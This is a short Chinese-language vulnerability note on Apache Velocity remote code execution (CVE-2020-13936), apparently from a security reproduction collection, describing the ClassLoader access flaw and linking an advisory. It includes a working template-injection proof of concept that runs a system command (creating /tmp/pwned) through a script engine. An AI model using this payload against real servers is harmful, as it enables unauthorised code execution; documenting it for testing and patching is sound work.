# Apache Velocity 远程代码执行 CVE-2020-13936

## 漏洞描述

Velocity Uberspector无法阻止访问java.lang.ClassLoader类加载器方法。在VelocityView的上下文中使用Velocity模板时，能够修改模版的攻击者可以使用与运行Servlet容器的帐户相同的权限执行任意Java代码或运行任意系统命令。

参考链接：

- https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity

## 漏洞复现

poc：

```
${req.getServletContext().getAttribute('org.apache.tomcat.InstanceManager').newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval("java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')")}
```

